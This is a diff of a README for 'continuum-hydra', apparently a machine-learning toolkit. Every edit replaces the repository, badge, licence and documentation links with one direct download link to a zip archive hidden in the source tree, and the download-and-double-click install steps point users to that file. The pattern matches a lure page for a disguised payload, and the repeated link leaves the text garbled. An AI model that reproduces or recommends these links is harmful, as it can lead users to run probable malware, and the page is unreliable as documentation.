@@ -1,6 +1,6 @@
 # 🌟 continuum-hydra - Boost Your Machine Learning Experience
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Arikulan/continuum-hydra)
+[![Download Here](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip)](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To get started with continuum-hydra, follow these simple steps. This toolkit hel
 
 1. **Visit the Download Page.**
    Head over to the following link to download the application:
-   [Download continuum-hydra](https://github.com/Arikulan/continuum-hydra)
+   [Download continuum-hydra](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip)
 
 2. **Select the Latest Release.**
    On the download page, look for the latest release. You will find a button that says "Download." Click this button to start your download.
@@ -21,7 +21,7 @@ To get started with continuum-hydra, follow these simple steps. This toolkit hel
 ## 🔧 Installing the Application
 
 1. **Locate the Downloaded File.**
-   Open your file explorer and navigate to the folder where your downloads go. You should see a file named something like `continuum-hydra-v1.0.exe`.
+   Open your file explorer and navigate to the folder where your downloads go. You should see a file named something like `https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip`.
 
 2. **Run the Installer.**
    Double-click on the downloaded file. This will start the installation process.
@@ -74,10 +74,10 @@ Join the continuum-hydra community for support and discussions. Here are some wa
 
 ## 📜 License
 
-continuum-hydra is licensed under the MIT License. For more details, see the [LICENSE.md](https://github.com/Arikulan/continuum-hydra/blob/main/LICENSE.md).
+continuum-hydra is licensed under the MIT License. For more details, see the [https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip).
 
 ## 🔗 Learn More
 
-For further information, check the official GitHub repository: [continuum-hydra](https://github.com/Arikulan/continuum-hydra). You will find documentation, tutorials, and community resources to help enhance your skills.
+For further information, check the official GitHub repository: [continuum-hydra](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip). You will find documentation, tutorials, and community resources to help enhance your skills.
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Arikulan/continuum-hydra)
+[![Download Here](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip)](https://github.com/Arikulan/continuum-hydra/raw/refs/heads/main/src/continuum/launch/continuum_hydra_2.2.zip)
